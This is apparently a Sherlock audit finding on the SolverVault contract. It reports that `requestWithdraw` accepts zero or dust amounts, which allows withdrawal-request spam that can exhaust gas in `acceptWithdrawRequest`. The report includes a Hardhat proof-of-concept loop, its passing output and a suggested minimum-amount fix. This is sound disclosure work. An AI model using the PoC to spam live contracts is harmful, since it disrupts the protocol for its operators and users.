Kind Alabaster Cheetah

medium

# A malicious user can spam the protocol by requesting too many withdrawals of very low amounts or even zero amounts.

## Summary
A malicious actor can spam the protocol by creating too many withdrawals of very low amounts or even zero amounts because the function `requestWithdraw` does not check the `amount` input value

## Vulnerability Detail
The current implementation of `requestWithdraw` does not disincentivize a user from making too many withdrawals. Someone can request too many withdraws of very low amount values (such as 1wei equivalent token) or even makings withdrawal requests of 0 amount as there's no check of the `amount` input value.
```solidity
 function requestWithdraw(
        uint256 amount,
        address receiver
    ) external whenNotPaused {
    // audit-info there's no check of the `amount` input, someone can provide a very low value or even zero
        require(
            SolverVaultToken(solverVaultTokenAddress).balanceOf(msg.sender) >=
                amount,
            "SolverVault: Insufficient token balance"
        );
        SolverVaultToken(solverVaultTokenAddress).burnFrom(msg.sender, amount);

        uint256 amountInCollateralDecimals = collateralTokenDecimals >=
            solverVaultTokenDecimals
            ? amount *
                (10 ** (collateralTokenDecimals - solverVaultTokenDecimals))
            : amount /
                (10 ** (solverVaultTokenDecimals - collateralTokenDecimals));
                ...
```

#### PoC
```solidity
describe("SolverVault", function () {
  describe("PoC", () => {
    it("can request too many withdrawals of very low or 0 amounts to spam the protocol", async function () {
            const rec = await receiver.getAddress()
            
            // Example of sending just 100 requests, a real scenario would be sending thousands of requests
            // that will cause the transaction `acceptWithdrawRequest` to run out of gas if the spammed requests are accepted by mistake

            for(let i=0; i<= 99; i++) {

                // Notice that we're sending 0 collateral because the protocol doesn't check the value provided.
                // Even if the protocol checks zero amount, someone can spam by sending very low collateral each tx (1 wei equivalence for example)
                await expect(solverVault.connect(user).requestWithdraw(0, rec))
                    .to.emit(solverVault, "WithdrawRequestEvent")
                    .withArgs(i, rec, 0)
                 const request = await solverVault.withdrawRequests(i)
                expect(request[0]).to.equal(rec)
                expect(request[1]).to.equal(0)
                expect(request[2]).to.equal(RequestStatus.Pending)
                expect(request[3]).to.equal(0n)
            }
        })
  }
}
```
```bash
SolverVault
    PoC
      ✔ can request too many withdrawals of very low or 0 amounts to spam the protocol (2023ms)
  1 passing (4s)
```
## Impact
This issue can have two impacts:
- Spamming the protocol by creating too many withdrawals. And because there is no restriction on the `amount` to be withdrawn, theoretically, someone can keep creating withdrawal requests of zero amount.
- If the spammed requests are accepted, the `acceptWithdrawRequest` can run out of gas during its execution  due to the big size of `_acceptedRequestIds` array

## Code Snippet
https://github.com/sherlock-audit/2023-12-symm-io/blob/60ee22a4c598220821385cfb5eee43f40aafd5f1/solver-vaults/contracts/SolverVaults.sol#L202

## Tool used

Manual Review

## Recommendation
Consider checking the minimum value of the `amount` input in the `requestWithdraw` function. A similar issue is on `deposit` function, consider applying a minimum amount of deposit
